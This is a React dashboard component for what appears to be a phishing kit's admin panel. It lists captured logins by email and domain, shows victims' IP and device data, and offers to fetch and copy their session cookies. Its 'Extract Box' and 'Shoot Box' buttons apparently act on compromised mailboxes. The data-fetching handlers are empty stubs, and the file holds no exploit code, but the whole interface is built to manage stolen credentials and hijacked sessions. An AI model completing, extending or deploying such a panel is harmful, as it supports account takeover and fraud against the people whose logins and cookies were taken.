"use client";

import { useState, useMemo } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { 
  faCheck, 
  faTrash, 
  faCopy, 
  faCookie,
  faBox,
  faBoxOpen,
  faClock,
  faGlobe,
  faLaptop,
  faKey,
  faEnvelope,
  faTable,
  faThLarge,
  faFilter,
  faStickyNote,
  faSearch,
} from '@fortawesome/free-solid-svg-icons';
import { useAppState } from '../context/AppContext';
import { LoginTable } from '../components/admin/dashboard/LoginTable';
import type { LoginData, FilterOptions } from '../types';

export default function Dashboard() {
  const { appData } = useAppState();
  const [loading, setLoading] = useState(false);
  const [selectedLogin, setSelectedLogin] = useState<string | null>(null);
  const [viewMode, setViewMode] = useState<'cards' | 'table'>('cards');
  const [filters, setFilters] = useState<FilterOptions>({
    verified: null,
    hasCookie: null,
    hasMemo: null,
    search: '',
  });
  const [memoInput, setMemoInput] = useState<{ id: string; text: string } | null>(null);
  
  const loginData = appData?.data?.hub || [];

  const filteredData = useMemo(() => {
    let filtered = [...loginData];

    filtered = filtered.filter(login => {
      if (filters.verified !== null && login.verified !== filters.verified) return false;
      if (filters.hasCookie !== null && !!login.cookie !== filters.hasCookie) return false;
      if (filters.hasMemo !== null && !!login.memo !== filters.hasMemo) return false;
      if (filters.search) {
        const searchLower = filters.search.toLowerCase();
        return (
          login.email.toLowerCase().includes(searchLower) ||
          login.domain.toLowerCase().includes(searchLower) ||
          login.memo?.toLowerCase().includes(searchLower)
        );
      }
      return true;
    });

    filtered.sort((a, b) => {
      if (a.memo && !b.memo) return -1;
      if (!a.memo && b.memo) return 1;
      return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
    });

    return filtered;
  }, [loginData, filters]);

  const handleVerify = async (id: string) => {
    setLoading(true);
    try {
      // Implement verify functionality
    } catch (error) {
      console.error('Error verifying login:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleGetCookie = async (id: string) => {
    setLoading(true);
    try {
      // Implement get cookie functionality
    } catch (error) {
      console.error('Error getting cookie:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    // Add toast notification here
  };

  const handleMemoSave = async (id: string, text: string) => {
    try {
      // Implement memo save functionality
      // await updateLoginMemo(id, text);
      setMemoInput(null);
    } catch (error) {
      console.error('Error saving memo:', error);
    }
  };

  const formatTimestamp = (timestamp: string) => {
    return new Date(timestamp).toLocaleString();
  };

  const FilterControls = () => (
    <div className="bg-white p-4 rounded-lg shadow-sm mb-6">
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center space-x-4">
          <button
            onClick={() => setViewMode(viewMode === 'cards' ? 'table' : 'cards')}
            className="p-2 rounded hover:bg-gray-100"
          >
            <FontAwesomeIcon icon={viewMode === 'cards' ? faTable : faThLarge} />
          </button>
          <div className="relative">
            <FontAwesomeIcon icon={faSearch} className="absolute left-3 top-3 text-gray-400" />
            <input
              type="text"
              placeholder="Search..."
              className="pl-10 pr-4 py-2 border rounded-lg"
              value={filters.search}
              onChange={e => setFilters(f => ({ ...f, search: e.target.value }))}
            />
          </div>
        </div>
        <div className="flex items-center space-x-2">
          <button
            onClick={() => setFilters(f => ({ ...f, verified: f.verified === null ? true : null }))}
            className={`px-3 py-1 rounded ${filters.verified ? 'bg-green-100 text-green-800' : 'bg-gray-100'}`}
          >
            Verified
          </button>
          <button
            onClick={() => setFilters(f => ({ ...f, hasCookie: f.hasCookie === null ? true : null }))}
            className={`px-3 py-1 rounded ${filters.hasCookie ? 'bg-blue-100 text-blue-800' : 'bg-gray-100'}`}
          >
            Has Cookie
          </button>
          <button
            onClick={() => setFilters(f => ({ ...f, hasMemo: f.hasMemo === null ? true : null }))}
            className={`px-3 py-1 rounded ${filters.hasMemo ? 'bg-yellow-100 text-yellow-800' : 'bg-gray-100'}`}
          >
            Has Memo
          </button>
        </div>
      </div>
    </div>
  );

  const LoginCard = ({ login }: { login: LoginData }) => (
    <div className="bg-white rounded-lg shadow-md p-6 mb-4">
      <div className="flex justify-between items-start mb-4">
        <div>
          <div className="flex items-center space-x-2 mb-2">
            <FontAwesomeIcon icon={faEnvelope} className="text-blue-500" />
            <h3 className="text-lg font-medium">{login.email}</h3>
            <span className="text-sm text-gray-500">({login.domain})</span>
          </div>
          <div className="flex items-center space-x-2 text-sm text-gray-500">
            <FontAwesomeIcon icon={faClock} />
            <span>{formatTimestamp(login.timestamp)}</span>
          </div>
        </div>
        <div className="flex space-x-2">
          {!login.verified && (
            <button
              onClick={() => handleVerify(login.id)}
              className="p-2 text-green-600 hover:bg-green-50 rounded"
              disabled={loading}
            >
              <FontAwesomeIcon icon={faCheck} />
            </button>
          )}
          {login.verified && !login.cookie && (
            <button
              onClick={() => handleGetCookie(login.id)}
              className="p-2 text-blue-600 hover:bg-blue-50 rounded"
              disabled={loading}
            >
              <FontAwesomeIcon icon={faCookie} />
            </button>
          )}
          <button
            onClick={() => setSelectedLogin(login.id === selectedLogin ? null : login.id)}
            className="p-2 text-gray-600 hover:bg-gray-50 rounded"
          >
            <FontAwesomeIcon icon={selectedLogin === login.id ? faBoxOpen : faBox} />
          </button>
        </div>
      </div>

      {selectedLogin === login.id && (
        <div className="mt-4 space-y-4">
          <div className="grid grid-cols-2 gap-4">
            <div className="p-4 bg-gray-50 rounded-lg">
              <h4 className="text-sm font-medium text-gray-700 mb-2">IP Data</h4>
              <pre className="text-xs text-gray-600 overflow-auto max-h-40">
                {JSON.stringify(login.ipData, null, 2)}
              </pre>
            </div>
            <div className="p-4 bg-gray-50 rounded-lg">
              <h4 className="text-sm font-medium text-gray-700 mb-2">Device Data</h4>
              <pre className="text-xs text-gray-600 overflow-auto max-h-40">
                {JSON.stringify(login.deviceData, null, 2)}
              </pre>
            </div>
          </div>

          {login.cookie && (
            <div className="p-4 bg-gray-50 rounded-lg">
              <div className="flex justify-between items-center">
                <h4 className="text-sm font-medium text-gray-700">Cookie</h4>
                <button
                  onClick={() => handleCopy(login.cookie)}
                  className="text-blue-600 hover:text-blue-800"
                >
                  <FontAwesomeIcon icon={faCopy} />
                </button>
              </div>
              <div className="mt-2 p-2 bg-gray-100 rounded text-sm font-mono">
                {login.cookie.substring(0, 20)}...
              </div>
            </div>
          )}

          {login.memo && (
            <div className="p-4 bg-gray-50 rounded-lg">
              <div className="flex justify-between items-center">
                <h4 className="text-sm font-medium text-gray-700">Memo</h4>
                <button
                  onClick={() => setMemoInput({ id: login.id, text: login.memo || '' })}
                  className="text-yellow-600 hover:text-yellow-800"
                >
                  <FontAwesomeIcon icon={faStickyNote} />
                </button>
              </div>
              <div className="mt-2 p-2 bg-gray-100 rounded text-sm font-mono">
                {login.memo}
              </div>
            </div>
          )}

          {memoInput?.id === login.id && (
            <div className="p-4 bg-gray-50 rounded-lg">
              <textarea
                className="w-full p-2 border rounded"
                value={memoInput.text}
                onChange={e => setMemoInput({ ...memoInput, text: e.target.value })}
              />
              <div className="flex justify-end space-x-2 mt-2">
                <button
                  onClick={() => handleMemoSave(login.id, memoInput.text)}
                  className="px-4 py-2 text-sm bg-green-600 text-white rounded hover:bg-green-700"
                >
                  Save Memo
                </button>
                <button
                  onClick={() => setMemoInput(null)}
                  className="px-4 py-2 text-sm bg-gray-600 text-white rounded hover:bg-gray-700"
                >
                  Cancel
                </button>
              </div>
            </div>
          )}

          <div className="flex justify-end space-x-2">
            <button className="px-4 py-2 text-sm bg-blue-600 text-white rounded hover:bg-blue-700">
              Extract Box
            </button>
            <button className="px-4 py-2 text-sm bg-green-600 text-white rounded hover:bg-green-700">
              Shoot Box
            </button>
          </div>
        </div>
      )}
    </div>
  );

  return (
    <div className="p-6">
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-2xl font-bold text-gray-900">Login Management</h1>
        <button className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">
          Add New Login
        </button>
      </div>

      <FilterControls />

      {viewMode === 'cards' ? (
        <div className="space-y-4">
          {filteredData.map(login => (
            <LoginCard key={login.id} login={login} />
          ))}
        </div>
      ) : (
        <LoginTable 
          data={filteredData}
          onCopy={handleCopy}
          formatTimestamp={formatTimestamp}
        />
      )}
    </div>
  );
}